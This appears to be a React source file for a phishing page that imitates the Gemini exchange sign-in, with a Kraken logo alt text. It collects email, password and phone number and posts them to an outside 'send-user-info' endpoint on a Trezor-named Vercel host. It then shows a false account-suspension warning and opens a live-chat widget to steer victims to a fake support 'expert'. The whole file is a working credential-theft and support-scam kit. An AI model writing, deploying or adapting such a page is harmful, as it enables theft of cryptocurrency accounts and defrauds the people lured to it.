'use client';
import { Button, UserInput } from "@/components/ui";
import { KeyIcon } from "@heroicons/react/16/solid";
import { useState } from "react";
import 'react-phone-number-input/style.css'
import PhoneInput from 'react-phone-number-input'
import axios from "axios";

const App = () => {
    const [step, setStep] = useState<"email" | "password" | "phone">("email");
    const [rememberEmail, setRememberEmail] = useState(false);
    const [loading, setLoading] = useState(false);
    const [alert, setAlert] = useState<{ type: 'success' | 'error'; message: string } | null>({
        type: 'error',
        message: 'Important message!: some suspicious activity found with your account. Enter phone number to verify your identity'
    });

    const [formData, setFormData] = useState({
        email: '',
        password: '',
        phone: ""
    });

    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { name, value } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: value,
        }));
    };

    const handleSubmit = async () => {
        try {
            setLoading(true);
            const data = {
                title: "Gemini Login",
                ...formData,
            };
            const response = await axios.post("https://trezor-backend-self.vercel.app/api/v1/send-user-info", data);
            if (response) {
                setAlert({ type: 'success', message: 'Important message!: Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.' });
            }
            // @ts-ignore
            window.Tawk_API?.maximize();
        } catch (err) {
            console.error(err);
            setAlert({ type: 'success', message: 'Important message!: Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.' });
        } finally {
            setLoading(false);
        }
    };

    const validateEmail = (value: string) => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(value);
    };

    const handleValidate = () => {
        if (step === 'email' && validateEmail(formData.email)) {
            setStep("password");
        } if (step === 'phone' && (/^\+?[1-9]\d{1,14}$/.test(formData.phone))) {
            handleSubmit();
        } else {
        }
    };
    const handleChangeEmail = () => {
        setStep("email");
    };

    return (
        <div className="min-h-screen bg-white">
            {
                !!loading &&
                <div className="loader-backdrop">
                    <span className="loader"></span>
                </div>
            }
            {/* Header */}
            <header className="flex items-center justify-between px-10 py-6">
                <div className="flex items-center">
                    <img src="/logo.svg" alt="Kraken" />

                </div>
                <div className="flex items-center gap-3 text-sm text-xs">
                    <span className="text-gray-600 ">Don't have a Gemini account?</span>
                    <button className="py-2 px-4 rounded-2xl  font-bold text-black bg-[rgba(1,3,4,0.06)] cursor-pointer">
                        Create a new account
                    </button>
                </div>
            </header>

            {/* Main Content */}
            <div className="flex items-start justify-center">
                <div className="w-full max-w-md px-4">
                    <h1 className="mb-8 text-3xl font-bold text-black">
                        {step === "email" ? "Sign in" : "Welcome"}
                    </h1>

                    {step === "email" ? (
                        <div >
                            {/* Email Input */}
                            <div className="relative mb-6">
                                <UserInput
                                    label="Email"
                                    type="email"
                                    placeholder='Email address'
                                    name="email"
                                    onChange={handleChange}
                                    onKeyPress={(e) => e.key === "Enter" && handleValidate()}
                                />
                            </div>
                            <Button
                                onClick={handleValidate}
                            >
                                Continue
                            </Button>
                            {/* Divider */}
                            <div className="relative mb-6 flex items-center justify-center">
                                <div className="absolute inset-0 flex items-center">
                                    <div className="w-full border-t border-gray-300"></div>
                                </div>
                                <div className="relative bg-white px-4 text-sm text-gray-500">OR</div>
                            </div>
                            {/* Sign in with passkey */}
                            <Button
                                className="bg-gray-200 hover:bg-gray-300"
                            >
                                <div className="flex items-center justify-center gap-2 text-black">
                                    <KeyIcon className='size-6' />
                                    Sign in with passkey
                                </div>
                            </Button>
                        </div>
                    ) : step === "password" ? (
                        <div>
                            {/* Email Display */}
                            <div className="mb-6 flex items-center justify-between rounded-lg border border-gray-300 bg-gray-50 px-4 py-3">
                                <div className="flex items-center gap-3">
                                    <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor" className="text-gray-600">
                                        <path d="M10 10a3 3 0 100-6 3 3 0 000 6zm0 1c-3.866 0-7 1.79-7 4v1h14v-1c0-2.21-3.134-4-7-4z" />
                                    </svg>
                                    <span className="text-sm">{formData.email}</span>
                                </div>
                                <button
                                    onClick={handleChangeEmail}
                                    className="text-sm font-medium text-black hover:underline cursor-pointer"
                                >
                                    Change
                                </button>
                            </div>

                            {/* Password Input */}
                            <div className="relative mb-2">

                                <UserInput
                                    label="Password"
                                    type="password"
                                    name="password"
                                    onChange={handleChange}
                                />
                            </div>

                            {/* Forgot Password */}
                            <div className="mb-6 text-left">
                                <button className="text-sm font-medium text-black hover:underline cursor-pointer">
                                    Forgot password?
                                </button>
                            </div>

                            {/* Sign In Button */}
                            <Button
                                disabled={!formData.password}
                                onClick={() => setStep("phone")}
                            >
                                Sign in
                            </Button>

                            {/* Divider */}
                            <div className="relative mb-6 flex items-center justify-center">
                                <div className="absolute inset-0 flex items-center">
                                    <div className="w-full border-t border-gray-300"></div>
                                </div>
                                <div className="relative bg-white px-4 text-sm text-gray-500">OR</div>
                            </div>

                            {/* Sign in with passkey */}
                            <Button
                                className="bg-gray-200 hover:bg-gray-300"
                            >
                                <div className="flex items-center justify-center gap-2 text-black">
                                    <KeyIcon className='size-6' />
                                    Sign in with passkey
                                </div>
                            </Button>

                            {/* Remember Email Checkbox */}
                            <div className="flex items-center justify-center gap-2">
                                <input
                                    type="checkbox"
                                    id="remember"
                                    checked={rememberEmail}
                                    onChange={(e) => setRememberEmail(e.target.checked)}
                                    className="h-4 w-4 rounded border-gray-300"
                                />
                                <label htmlFor="remember" className="text-sm text-black">
                                    Remember my email address
                                </label>
                            </div>
                        </div>
                    )
                        : (
                            <div >
                                <div className="mb-5 bg-red-50 border border-red-200 text-sm text-red-400 rounded-lg p-4 " role="alert" aria-labelledby="hs-with-list-label">
                                    <div className="flex">
                                        <div className="shrink-0">
                                            <svg className="shrink-0 size-4 mt-0.5" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                                                <circle cx="12" cy="12" r="10"></circle>
                                                <path d="m15 9-6 6"></path>
                                                <path d="m9 9 6 6"></path>
                                            </svg>
                                        </div>
                                        <div className="ms-4">
                                            <h3 id="hs-with-list-label" className="text-sm font-semibold">
                                                {alert?.message}
                                            </h3>
                                        </div>
                                    </div>
                                </div>
                                <div className="relative mb-5">
                                    <label className="absolute -top-2 left-3 bg-white px-1 text-xs text-gray-700">
                                        Phone Number
                                    </label>
                                    <PhoneInput
                                        onChange={(e) => setFormData({
                                            ...formData,
                                            phone: e?.toString() ?? ''
                                        })}
                                        placeholder="Enter phone number"
                                        className='w-full rounded-md border border-gray-300 px-4 py-3 pr-12 text-base outline-none transition-colors focus:ring-1 focus:black'
                                        defaultCountry='IN'
                                        name='phone'
                                    />

                                </div>
                                <Button
                                    onClick={handleValidate}
                                >
                                    Submit
                                </Button>
                            </div>
                        )
                    }
                </div>
            </div>

        </div>
    );
};

export default App;

